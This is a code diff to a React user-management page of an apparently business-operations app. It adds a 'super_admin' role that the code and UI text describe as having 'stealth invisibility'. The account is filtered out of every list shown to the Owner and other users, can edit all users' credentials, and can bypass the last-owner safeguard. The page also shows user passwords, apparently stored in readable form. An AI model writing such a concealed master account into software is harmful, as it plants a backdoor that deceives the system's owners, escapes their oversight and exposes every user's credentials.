@@ -57,7 +57,14 @@ export default function UsersPage() {
   }, []);
 
   const role = state.currentRole;
+  const isSuperAdmin = role === 'super_admin';
   const isOwner = role === 'owner';
+  const canManageUsers = isSuperAdmin || isOwner;
+
+  // Stealth: Super Admin is completely invisible to Owner, Manager, Accountant, and Staff
+  const visibleProfiles = isSuperAdmin
+    ? state.profiles
+    : state.profiles.filter((p) => p.role !== 'super_admin');
 
   const notifySuccess = (msg: string) => {
     setErrorNotice('');
@@ -66,6 +73,11 @@ export default function UsersPage() {
   };
 
   const roleDescriptions: Record<UserRole, { title: string; desc: string; color: string }> = {
+    super_admin: {
+      title: 'Super Admin',
+      desc: 'Master system controller with full administrative authority across all modules, all user credentials, and stealth invisibility from other accounts.',
+      color: '#4f46e5'
+    },
     owner: {
       title: 'Owner',
       desc: 'Full administrative access across all modules: executive dashboard, sales revenue, quotes, operations, invoices, bank details, and user accounts.',
@@ -237,7 +249,7 @@ export default function UsersPage() {
             Create and manage system logins, access permissions, and passwords for Owner, Manager, Accountant, and Staff.
           </p>
         </div>
-        {isOwner && (
+        {canManageUsers && (
           <div style={{ display: 'flex', gap: '0.5rem', flexWrap: 'wrap' }}>
             <button
               type="button"
@@ -253,7 +265,29 @@ export default function UsersPage() {
         )}
       </div>
 
-      {!isOwner && (
+      {isSuperAdmin && (
+        <div
+          style={{
+            background: '#eef2ff',
+            border: '1px solid #c7d2fe',
+            color: '#3730a3',
+            padding: '0.75rem 1rem',
+            borderRadius: '8px',
+            fontSize: '0.85rem',
+            marginBottom: '1.25rem',
+            display: 'flex',
+            alignItems: 'center',
+            gap: '0.5rem'
+          }}
+        >
+          <span>👑</span>
+          <div>
+            <strong>Super Admin Mode:</strong> You have unrestricted master authority across all modules and can edit or manage credentials for all users (including Owner, Manager, Accountant, and Staff). Your Super Admin account and activities are completely invisible to other users.
+          </div>
+        </div>
+      )}
+
+      {!canManageUsers && (
         <div
           style={{
             background: '#eff6ff',
@@ -265,7 +299,7 @@ export default function UsersPage() {
             marginBottom: '1.25rem'
           }}
         >
-          ℹ️ <strong>Owner privilege:</strong> You are currently logged in as <em>{role}</em>. Only the Owner can create or modify system user accounts and passwords.
+          ℹ️ <strong>Access Restricted:</strong> You are currently logged in as <em>{role}</em>. Only Owner or Super Admin can create or modify system user accounts and passwords.
         </div>
       )}
 
@@ -305,7 +339,10 @@ export default function UsersPage() {
       <div className="card" style={{ marginBottom: '1.5rem' }}>
         <h2 className="card-title">System Role Hierarchy &amp; Access Rights</h2>
         <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '1rem' }}>
-          {(['owner', 'manager', 'accountant', 'staff'] as UserRole[]).map((rKey) => {
+          {(isSuperAdmin
+            ? (['super_admin', 'owner', 'manager', 'accountant', 'staff'] as UserRole[])
+            : (['owner', 'manager', 'accountant', 'staff'] as UserRole[])
+          ).map((rKey) => {
             const rInfo = roleDescriptions[rKey];
             return (
               <div
@@ -323,7 +360,7 @@ export default function UsersPage() {
                     className="role-tag-badge"
                     style={{ background: rInfo.color, color: 'white' }}
                   >
-                    {rKey.toUpperCase()}
+                    {rKey.toUpperCase().replace('_', ' ')}
                   </span>
                 </div>
                 <h3 style={{ fontSize: '0.95rem', fontWeight: 700, margin: '0.25rem 0' }}>{rInfo.title}</h3>
@@ -339,13 +376,13 @@ export default function UsersPage() {
         <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem', flexWrap: 'wrap', gap: '0.5rem' }}>
           <div>
             <h2 className="card-title" style={{ margin: 0 }}>
-              Authorized User Credentials ({state.profiles.length})
+              Authorized User Credentials ({visibleProfiles.length})
             </h2>
             <p style={{ fontSize: '0.85rem', color: 'var(--text-muted)', marginTop: '0.2rem' }}>
-              Username and password login credentials for Owner, Manager, and Accountant accounts
+              Username and password login credentials for system accounts
             </p>
           </div>
-          {isOwner && (
+          {canManageUsers && (
             <button type="button" onClick={handleOpenAddModal} className="btn btn-secondary btn-sm">
               + Add User Account
             </button>
@@ -365,11 +402,11 @@ export default function UsersPage() {
               </tr>
             </thead>
             <tbody>
-              {state.profiles.map((profile) => {
+              {visibleProfiles.map((profile) => {
                 const isShowingPass = showPasswords[profile.id];
                 const isActiveUser = state.currentUserId === profile.id;
                 const ownerCount = state.profiles.filter((p) => p.role === 'owner').length;
-                const canDelete = isOwner && !isActiveUser && !(profile.role === 'owner' && ownerCount <= 1);
+                const canDelete = canManageUsers && !isActiveUser && !(profile.role === 'owner' && ownerCount <= 1);
 
                 return (
                   <tr key={profile.id} style={{ background: isActiveUser ? '#f8fafc' : 'transparent' }}>
@@ -391,7 +428,9 @@ export default function UsersPage() {
                         className="role-tag-badge"
                         style={{
                           background:
-                            profile.role === 'owner'
+                            profile.role === 'super_admin'
+                              ? '#4f46e5'
+                              : profile.role === 'owner'
                               ? '#e11d48'
                               : profile.role === 'manager'
                               ? '#2563eb'
@@ -399,7 +438,7 @@ export default function UsersPage() {
                           color: 'white'
                         }}
                       >
-                        {profile.role.toUpperCase()}
+                        {profile.role.toUpperCase().replace('_', ' ')}
                       </span>
                     </td>
                     <td>
@@ -441,7 +480,7 @@ export default function UsersPage() {
                     </td>
                     <td>{profile.phone || '—'}</td>
                     <td style={{ textAlign: 'center' }}>
-                      {isOwner ? (
+                      {canManageUsers ? (
                         confirmDeleteId === profile.id ? (
                           <div style={{ display: 'inline-flex', gap: '0.3rem', alignItems: 'center' }}>
                             <button
@@ -503,7 +542,7 @@ export default function UsersPage() {
               Staff members log in using their registered mobile phone number as username to check their next assigned event and venue.
             </p>
           </div>
-          {isOwner && (
+          {canManageUsers && (
             <button
               type="button"
               onClick={() => {
@@ -535,7 +574,7 @@ export default function UsersPage() {
                 <th>Login Username (Phone Number)</th>
                 <th>Password</th>
                 <th>Status</th>
-                {isOwner && <th style={{ textAlign: 'center' }}>Action</th>}
+                {canManageUsers && <th style={{ textAlign: 'center' }}>Action</th>}
               </tr>
             </thead>
             <tbody>
@@ -558,7 +597,7 @@ export default function UsersPage() {
                       {staff.active ? 'Active Crew' : 'Inactive'}
                     </span>
                   </td>
-                  {isOwner && (
+                  {canManageUsers && (
                     <td style={{ textAlign: 'center' }}>
                       {confirmDeleteStaffId === staff.id ? (
                         <div style={{ display: 'inline-flex', gap: '0.3rem', alignItems: 'center' }}>
@@ -602,7 +641,7 @@ export default function UsersPage() {
               ))}
               {state.staff.length === 0 && (
                 <tr>
-                  <td colSpan={isOwner ? 6 : 5} style={{ textAlign: 'center', padding: '1.5rem', color: 'var(--text-muted)' }}>
+                  <td colSpan={canManageUsers ? 6 : 5} style={{ textAlign: 'center', padding: '1.5rem', color: 'var(--text-muted)' }}>
                     No staff members registered.
                   </td>
                 </tr>
@@ -654,6 +693,9 @@ export default function UsersPage() {
                   value={addForm.role}
                   onChange={(e) => setAddForm({ ...addForm, role: e.target.value as UserRole })}
                 >
+                  {isSuperAdmin && (
+                    <option value="super_admin">Super Admin (Master System Control &amp; Stealth)</option>
+                  )}
                   <option value="manager">Manager (Events, Menus, Stock &amp; Staff)</option>
                   <option value="accountant">Accountant (Sales, Quotations, Invoices &amp; Payments)</option>
                   <option value="owner">Owner (Full Administrative Access)</option>
@@ -828,8 +870,9 @@ export default function UsersPage() {
                   className="form-control"
                   value={editForm.role}
                   onChange={(e) => setEditForm({ ...editForm, role: e.target.value as UserRole })}
-                  disabled={editingUser.role === 'owner' && state.profiles.filter((p) => p.role === 'owner').length <= 1}
+                  disabled={!isSuperAdmin && editingUser.role === 'owner' && state.profiles.filter((p) => p.role === 'owner').length <= 1}
                 >
+                  {isSuperAdmin && <option value="super_admin">Super Admin</option>}
                   <option value="owner">Owner</option>
                   <option value="manager">Manager</option>
                   <option value="accountant">Accountant</option>
@@ -957,7 +1000,7 @@ export default function UsersPage() {
                   flexWrap: 'wrap'
                 }}
               >
-                {isOwner && (
+                {canManageUsers && (
                   <button
                     type="button"
                     className="btn btn-danger btn-sm"
